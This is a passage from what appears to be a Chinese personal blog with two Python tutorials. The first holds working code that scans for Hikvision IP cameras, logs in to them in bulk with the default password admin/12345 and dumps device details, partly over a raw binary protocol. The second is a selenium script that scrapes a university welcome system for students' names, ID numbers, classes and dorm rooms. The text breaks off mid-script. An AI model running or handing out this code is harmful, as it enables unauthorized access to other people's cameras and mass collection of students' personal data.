ips.remove(<span class="string">'#masscan'</span>)</span><br><span class="line">    <span class="comment"># ips.remove('# end')</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    ips.remove(<span class="string">'saddr'</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    ips.remove(<span class="string">''</span>)</span><br><span class="line"><span class="comment"># 保存80端口响应</span></span><br><span class="line">server_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_service</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test"</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip,</span><br><span class="line">                  verify=<span class="keyword">False</span>,</span><br><span class="line">                  allow_redirects=<span class="keyword">True</span>,</span><br><span class="line">                  timeout=<span class="number">20</span>)</span><br><span class="line">        server_dict[ip] = r</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">30</span>)</span><br><span class="line">pool.join(timeout=<span class="number">20</span>)</span><br><span class="line">pool.map(check_service, ips)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Dumping port-80 response..."</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(server_dict, f)</span><br></pre></td></tr></table></figure>
<p>好吧，monkey_patch,gevent这点非常适合这种quick&amp;dirty的脏活累活，就像我常做的事情。。。</p>
<p><img src="/images/spider/net_scan_2.png" alt=""></p>
<p>gevent是啥呢？不知道的自己谷歌吧，我也不知道是啥，据说是对libev的封装，据说是协程、据说是yield，据说yield是好像操作系统完成一次任务切换，据说操作系统任务切换在x86下要靠TSS，据说…</p>
<p>总之，你阻塞的每次请求变成了可以并发的请求。这里的坑我不想说，因为我不懂= =，但你可以自己试试不用gevent的版本。</p>
<p>另外，这里会比masscan慢上无数倍，masscan用用户态的网络栈来实现无状态了，我们这里则是用着系统提供的网络栈。</p>
<p>接下来，该看看怎么获取某种摄像头的“基因”并且批量登录了，这之前已经提到过，用浏览器检查整个过程。找到其特点。</p>
<p><img src="/images/spider/net_scan_3.png" alt=""></p>
<p>我觉得这东西就是其特点了<span>´ ▽ ` )ﾉ</span></p>
<p>对符合特点的ip地址，我们不妨试着登录下。果然跳转到另一个页面了。分析下如何登录的吧</p>
<p>这种默认用户名密码上网一搜就搜到了= =</p>
<p><img src="/images/spider/net_scan_4.png" alt=""></p>
<p><img src="/images/spider/net_scan_5.png" alt=""></p>
<p>同理，我们可以找到设备信息的地址。万事具备，只剩代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">获取摄像头信息框架</span><br><span class="line">输入：</span><br><span class="line">- 特征字符串</span><br><span class="line">- 获取信息方法。同步/异步</span><br><span class="line">输出：</span><br><span class="line">编号文件camera_num</span><br><span class="line">id:name:username:password</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line">monkey.patch_all()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"><span class="comment"># Hikvision: 可登录验证</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 第一种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_1 = &#123;&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"-"</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'doc/page/login.asp'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line">        t_1[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第一种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.auth = (<span class="string">'admin'</span>, <span class="string">'12345'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/PSIA/System/deviceInfo'</span>)</span><br><span class="line">        <span class="keyword">if</span> r.ok:</span><br><span class="line">            t_1[ip] = r.content</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s.get(<span class="string">'http://'</span> + ip + <span class="string">'/ISAPI/System/deviceInfo'</span>)</span><br><span class="line">            <span class="keyword">if</span> r.ok:</span><br><span class="line">                t_1[ip] = r.content</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_1[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gevent.pool <span class="keyword">import</span> Pool</span><br><span class="line">pool = Pool(<span class="number">300</span>)</span><br><span class="line">pool.join(timeout=<span class="number">100</span>)</span><br><span class="line">pool.map(device_info, [ip <span class="keyword">for</span> ip <span class="keyword">in</span> t_1.keys()])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 1 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_1.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_1, f)</span><br></pre></td></tr></table></figure>
<p><img src="/images/spider/net_scan_6.png" alt=""></p>
<p>获取的设备信息是xml格式的，我们可以自由的利用python的xml库进行解析，进行数据分析等等。</p>
<p>另外，有很多摄像头要求浏览器安装自己的浏览器activex插件，我们可以用wireshark或类似东西抓下包，找到其相关信息的位置，然后猜测解析协议。比如，另一种摄像头</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">t_2</span><br><span class="line">OCX</span><br><span class="line">"""</span></span><br><span class="line"><span class="comment"># <span class="doctag">FIXME:</span> 经常失败？</span></span><br><span class="line"><span class="comment"># 目前想法是控制timeout</span></span><br><span class="line"><span class="comment"># 多次请求后成功率变高？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置默认timeout时间</span></span><br><span class="line">timeout = <span class="number">2</span></span><br><span class="line">socket.setdefaulttimeout(timeout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./data/dict/server_dict.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    server_dict = pickle.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span> * <span class="number">40</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find IP Camera Type 2"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Hikvision IP Camera found:(ObjectX, check disabled)"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Username: admin"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Password: 12345"</span></span><br><span class="line">t_2 = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> server_dict.iteritems():</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">1</span>].content.find(<span class="string">'NetOCX'</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">        t_2[x[<span class="number">0</span>]] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">print</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 抓取第二种设备信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">device_info</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"test "</span>, ip</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">        s.send(<span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00"</span>)</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        login_rt = <span class="string">"\x00\x00\x00L'\x00\x00\x00\x00\x00\x00'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"</span></span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">if</span> data != login_rt:</span><br><span class="line">            t_2[ip] = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 首先是个seq</span></span><br><span class="line">            <span class="comment"># 可能无效包，但测试必须有后面才正常</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">                seq_req = <span class="string">"\x00\x00\x00TZ\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x04\x00(\xc1\x00\x00\x00\x00\x0f\x02\x00\n\x08\x00';Je\x00\x00z\xdaf\x00\x8d\x16\xd2~\x9dU\x05\xf1\x1fi\xbb\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc3\xd0\xa2|\xa6v\xbd\xf3\x1eO\xd1\xcb\xdc\xae\xcbd"</span></span><br><span class="line">                s.send(seq_req)</span><br><span class="line">                seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">del</span> seq_ret</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="comment"># 然后是name_seq</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            name_seq_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(name_seq_req)</span><br><span class="line">            name_seq_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "name_seq_ret: ", name_seq_ret</span></span><br><span class="line">            s.close()</span><br><span class="line">            <span class="comment"># 其次是chanel</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            chanel_req = <span class="string">"\x00\x00\x00$Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x022\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00\x00\x00\x00\x01"</span></span><br><span class="line">            s.send(chanel_req)</span><br><span class="line">            chanel_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># print "Chanle_ret: ", chanel_ret</span></span><br><span class="line">            <span class="comment"># 再来解析mac地址</span></span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">            s.connect((ip, <span class="number">8000</span>))</span><br><span class="line">            mac_req = <span class="string">"\x00\x00\x00 Z\x00\x00\x00\x00\x00\x00\x00\x00\x02\x01\x00\x0f\x02\x00\n\x00\x01\x00\x02\x08\x00';Je\x00\x00"</span></span><br><span class="line">            s.send(mac_req)</span><br><span class="line">            mac_ret = s.recv(<span class="number">1024</span>)</span><br><span class="line">            s.close()</span><br><span class="line">            t_2[ip] = &#123;<span class="string">'chanel'</span>: chanel_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>).decode(<span class="string">'gbk'</span>),</span><br><span class="line">                       <span class="string">'server_name'</span>: name_seq_ret[<span class="number">20</span>:<span class="number">40</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'seqnum'</span>: name_seq_ret[<span class="number">60</span>:<span class="number">100</span>].strip(<span class="string">'\x00'</span>),</span><br><span class="line">                       <span class="string">'mac'</span>: <span class="string">"%02x:%02x:%02x:%02x:%02x:%02x:"</span> % struct.unpack(<span class="string">'BBBBBB'</span>, mac_ret[<span class="number">36</span>:<span class="number">42</span>])&#125;</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        t_2[ip] = <span class="string">''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> t_2.keys():</span><br><span class="line">    device_info(ip)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] Dumping type 2 devices info"</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./dump/camera/t_2.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(t_2, f)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> t_2.iteritems():</span><br><span class="line">    <span class="keyword">if</span> v == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">print</span> k, <span class="string">': login failed'</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">print</span> k, <span class="string">': Ok, info dumped.'</span></span><br></pre></td></tr></table></figure>
<p>根据同样的原理，我们还可以写爬虫搜集整个局域网互联网内其它信息，比如ftp，特别是匿名ftp，sql，代理服务器啊，等等，</p>
<p>大概是知道创宇的zoomeye出来之前，我想在贵邮局域网实现shadon，一个设备杂项搜索引擎，最后，实验室太忙了= =只有个从未公开的ftp搜索web界面</p>
<p><img src="/images/spider/net_scan_7.png" alt=""></p>
<p>第一次做效率奇低，特别在加上不同的中文编码</p>
<p><img src="/images/spider/net_scan_8.png" alt=""></p>
<p>第二次好多了，如果以后有空再说吧</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2015/04/05/yingxin/" itemprop="url">
                  Python Spider: 迎新系统学生信息爬取
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-04-05T00:00:00+08:00" content="2015-04-05">
              2015-04-05
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2015/04/05/yingxin/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2015/04/05/yingxin/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="每一颗眼泪，是一万道光：迎新系统学生信息爬取">每一颗眼泪，是一万道光：迎新系统学生信息爬取</h2><blockquote>
<p>You don’t get over the fear. You run towards it, with your knees buckling.</p>
<p>—Amin Ariana, Technical Founder, hacker and advisor at several ventures</p>
</blockquote>
<p>有多少次，希望那短暂平凡的一刻又一刻定格到永恒。</p>
<p>简简单单就是幸福</p>
<p>忘乎所有只有热爱</p>
<hr>
<p>去年8月，来跪邮写得第一个程序。在学十还略显空荡的房间，空荡荡的桌面，床上没有被子只有个睡袋，惨白惨白的灯光和兴奋的新同学们。</p>
<p>这次，依然是selenium专场。让程序操作浏览器。</p>
<p>首先，依然是研究整个流程。</p>
<p>打开 <a href="http://welcome.bupt.edu.cn" target="_blank" rel="external">http://welcome.bupt.edu.cn</a></p>
<p>看看怎么登录</p>
<p><img src="/images/spider/yingxin.png" alt=""></p>
<p>一切显而易见，输入用户名密码，点击登录按钮。</p>
<p>进入界面</p>
<p><img src="/images/spider/yingxin1.png" alt=""></p>
<p>这时候看到有个选框，发现可以选择研究生或者本科生。在这里我不讨论这个问题，留作读者自己思考。</p>
<p>我们随便翻翻看看</p>
<p>注意到左下角有几个页码，左边还有个<code>3136/210</code>之类的东西。</p>
<p>大概研究下猜想，3136是学生总数，210是总页数。</p>
<p>同时注意到页码是一次显示5页，通过点击<code>&gt;</code>翻入下个5页。</p>
<p><img src="/images/spider/yingxin2.png" alt=""></p>
<p>为了得到我们要翻多少页，需要提取出210这个数。我们已经讲过如何用xpath来索引到对应的元素。</p>
<p><img src="/images/spider/yingxin3.png" alt=""></p>
<p>紧接着，抓取，点击下一页，每翻五页，点击<code>&gt;</code>，然后继续重复以上步骤。</p>
<p>直到把210页全翻完。</p>
<p>我们要提取的信息在class<code>porlet-table</code>中</p>
<p><img src="/images/spider/yingxin4.png" alt=""></p>
<p>接着，一切都显而易见了，用selenium自动化这个步骤。</p>
<p>我是直接在ipython中一点点试验这个过程，最后把历史记录摘录出来写成程序，最后在ipython中打开pdb自动捕捉异常的功能或者设置断点来运行调试。</p>
<p>当然，也许你使用自己的方式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment">#from selenium.webdriver.common.keys import Keys</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Reverland'</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">You know what it is...</span><br><span class="line">With NO warranty.</span><br><span class="line">At your OWN risk.</span><br><span class="line"></span><br><span class="line">A quick and dirty spider implemented with selenium webdriver</span><br><span class="line">to dump the students' dorm data</span><br><span class="line"></span><br><span class="line">条码号  姓名    院系    专业    学号    班级    宿舍校区    宿舍区  宿舍楼</span><br><span class="line">宿舍房号    床号    入住情况</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(<span class="string">"http://welcome.bupt.edu.cn"</span>)</span><br><span class="line">username = driver.find_element_by_id(<span class="string">"username"</span>)</span><br><span class="line">password = driver.find_element_by_id(<span class="string">"password"</span>)</span><br><span class="line">username.send_keys(<span class="string">"2xxxxxx"</span>)</span><br><span class="line">password.send_keys(<span class="string">"xxxxx"</span>)</span><br><span class="line">submit = driver.find_element_by_name(<span class="string">"submit"</span>)</span><br><span class="line">submit.click()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login success</span></span><br><span class="line"><span class="comment"># y</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">xpath_p_last = <span class="string">'//div[@class="pagination-info clearFix"]/span'</span></span><br><span class="line">n_pages = driver.find_element_by_xpath(xpath_p_last)</span><br><span class="line">p_last = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">n_student = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of Students Found: "</span>, n_student</span><br><span class="line"><span class="keyword">while</span> (p &lt;= p_last):</span><br><span class="line">    time.sleep(random.randint(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">    table = driver.find_element_by_class_name(<span class="string">"portlet-table"</span>)</span><br><span class="line">    <span class="comment"># remove headers</span></span><br><span class="line">    text = table.text[<span class="number">45</span>::] + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">print</span> text</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"bupt_students_yan.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p &gt; p_last:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"finished"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> p % <span class="number">5</span> == <span class="number">1</span>:</span><br><span class="line">        driver.find_element_by_link_text(<span class="string">"&gt;"</span>).click()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        driver.find_element_by_link_text(str(p)).click()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b</span></span><br><span class="line">option = driver.find_element_by_xpath(<span class="string">'//select/option[@value="serieN10B"]'</span>)</span><br><span class="line">option.click()</span><br><span class="line">p = <span class="number">1</span></span><br><span class="line">xpath_p_last = <span class="string">'//div[@class="pagination-info clearFix"]/span'</span></span><br><span class="line">n_pages = driver.find_element_by_xpath(xpath_p_last)</span><br><span class="line">p_last = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">1</span>])</span><br><span class="line">n_student = int(n_pages.text.split(<span class="string">'/'</span>)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Number of Students Found: "</span>, n_student</span><br><span class="line"><span class="keyword">while</span> (p &lt;= p_last):</span><br><span class="line">    time.sleep(random.randint(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line">    table = driver.find_element_by_class_name(<span class="string">"portlet-table"</span>)</span><br><span class="line">    <span class="comment"># remove headers</span></span><br><span class="line">    text = table.text[<span class="number">45</span>::] + <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">print</span> text</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"bupt_students_ben.txt"</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    p += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> p &gt; p_last:</span><br><span class="line">        <span class="keyword">print</span> <span 